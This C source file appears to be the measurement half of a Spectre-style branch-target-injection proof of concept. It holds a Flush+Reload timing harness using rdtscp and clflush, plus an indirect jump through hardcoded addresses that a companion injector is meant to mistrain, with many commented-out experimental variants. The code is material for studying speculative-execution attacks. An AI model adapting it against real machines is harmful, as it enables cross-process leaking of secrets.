#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>
#include "common.h"


#define NUM_PROBES 100
#define PROBE_IDX 0

#define MAX_PROBE_SPACE (1000003)  //


uint64_t cur_probe_space = 4177;



//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));

unsigned int junk=0;

// Put this in its own (4KB) page
//uint8_t probe_buf[4096*256*1024];
uint8_t *probe_buf;


uint8_t *signal_ptr;   // Point to some cache-aligned memory surrounded by...nothing
uint8_t signal_idx = 0;

//uint8_t stack_probe_buf[PROBE_SPACE*NUM_PROBES];

// Keep stats
uint64_t cache_hits = 0;    // Basically number of times target_fn was speculatively executed
uint64_t tot_runs = 0;
uint64_t tot_time = 0;

/*
 * This function is NEVER CALLED in measure.c
 * but if it is speculatively executed,
 * (because of a sucessful mistrain by inject.c)
 * then we'll load probe_buf[100] into cache
 */
void target_fn(void) __attribute__((section(".targetfn")));
//void target_fn(void);
#if 0
void target_fn(void) {
    //int idx = (signal_idx*3)&0xff;
    asm volatile (
        "mov (%%rcx), %%rbx\n"
        "movb (%%rbx), %%al\n" :: "c"(0x6030c8) : "rax");
    //asm volatile ( "movb (%%rbx), %%al\n" :: "b"(&probe_buf[cur_probe_space*((NUM_PROBES-1)-signal_idx)]) : "rax");
    //asm volatile ( "movb (%%rbx), %%al\n" :: "b"(&probe_buf[PROBE_SPACE*(((signal_idx*167)+13)&0xf)]) : "rax");
    //asm volatile ( "movb (%%rbx), %%al\n" :: "b"(&probe_buf[PROBE_SPACE*(signal_idx)]) : "rax");
        /*
    asm volatile(
            "mov %%rax, %%rcx\n"
            "add %%rax, %%rax\n"    // rax = idx + idx
            "add %%rcx, %%rax\n"    // rax += idx
            "and $0xff, %%rax\n"    // rax &= 0xff
            "imul $0xf4243,%%rax,%%rax\n"
            "add %%rax,%%rbx\n"
            "movb (%%rbx), %%al\n" :: "a"(signal_idx), "b"(probe_buf) : "rcx");
            //*/
        


    //asm volatile( "nop");
    //asm volatile ( "movb (%%rbx), %%al\n" :: "b"(&probe_buf[1200]) : "rax");


}
#endif

uint64_t results[NUM_PROBES];

void test() {
    uint64_t t0, t1;
    //uint8_t *addr = signal_ptr;
    uint8_t *addr;

    int i;
    for (i=0; i<NUM_PROBES; i++) {
        addr = &probe_buf[i*cur_probe_space];
        t0 = _rdtscp(&junk);
        asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
        t1 = _rdtscp(&junk);
        if (t1-t0 < 140) {
            cache_hits++;
            tot_time += t1-t0;
            results[i]++;
            //printf("# %lu\n", t1-t0);
            //_mm_clflush(addr);
        }
    }
    tot_runs++;

    // Clear probe_buf from cache

    for (i=0; i<NUM_PROBES; i++) {
        //_mm_clflush(&probe_buf[i*1024*1024]);
        //int mix_i = ((i*167)+13)&255;

        _mm_clflush(&probe_buf[i*cur_probe_space]);

        //_mm_clflush(signal_ptr);
    }
    //_mm_clflush(signal_ptr);
    //_mm_clflush(&probe_buf[193*1024*1024]);
    //_mm_clflush(&probe_buf[100*1024*1024]);
}

uint64_t jmp_ptr;

void measure() {
    fn_ptr = test;
    //jmp_ptr = 0x400e5d; //400a5d
    jmp_ptr = 0x400e60;
    int i;
    while (1) {
        for (i=0; i<10000; i++) {
            _mm_clflush(fn_ptr);
            _mm_clflush(&jmp_ptr);
            indirect(&jmp_ptr);
            //usleep(100);
            //usleep(1);
        }
        uint64_t avg = 0;
        if (cache_hits > 0) avg = tot_time/cache_hits;

        uint64_t max_res=0, max_i=0;
        for (i=0; i<NUM_PROBES; i++) {
            if (results[i]>max_res) {
                max_res = results[i];
                max_i = i;
            }
        }

        //printf("%lu / %lu = %0.5f%% hits, %lu avg ns\n", cache_hits, tot_runs, 100*((float)cache_hits)/tot_runs, avg);
        if (max_res > 10 && avg < 80){
            printf("[%lu]: %lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld\n", max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space);
            signal_idx++;
        } else {
            printf("--[%lu]: %lu, %lu avg cycles ps %ld\n", max_i, max_res, avg, cur_probe_space);
            cur_probe_space += 63;
            cur_probe_space %= MAX_PROBE_SPACE;
        }
        cache_hits = 0;
        tot_runs = 0;
        tot_time = 0;
        signal_ptr = &probe_buf[signal_idx*cur_probe_space];
        memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
        //signal_idx++;
        signal_idx %= NUM_PROBES;
        //if (signal_idx >= NUM_PROBES) {
        //    signal_idx = 0;
        //}
        usleep(10);
    }


}

void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{
    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
    if (probe_buf == NULL) {
        perror("malloc");
        return -1;
    }

    printf("probe_buf @%p\n", probe_buf);
    int i =0;
    for (i=0; i<NUM_PROBES; i++) {
        memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
        //memset(&stack_probe_buf[i*PROBE_SPACE], i, PROBE_SPACE);
        //_mm_clflush(&probe_buf[i*MAX_PROBE_SPACE]);
        //_mm_clflush(&stack_probe_buf[i*PROBE_SPACE]);
    }

    //signal_ptr = (uint8_t*)(((uint64_t)(probe_buf + PROBE_SPACE*PROBE_IDX)));
    //printf("probe_buf[.]: %p\n", &probe_buf[PROBE_SPACE*PROBE_IDX]);
    //printf("signal_ptr:   %p\n", signal_ptr);



    fn_ptr = test;
    printf("test() @ %p\n", test);
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);

    printf("target_fn = %p\n", target_fn);

    printf("measuring...\n");

    signal_ptr = &probe_buf[signal_idx*cur_probe_space];

    measure();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
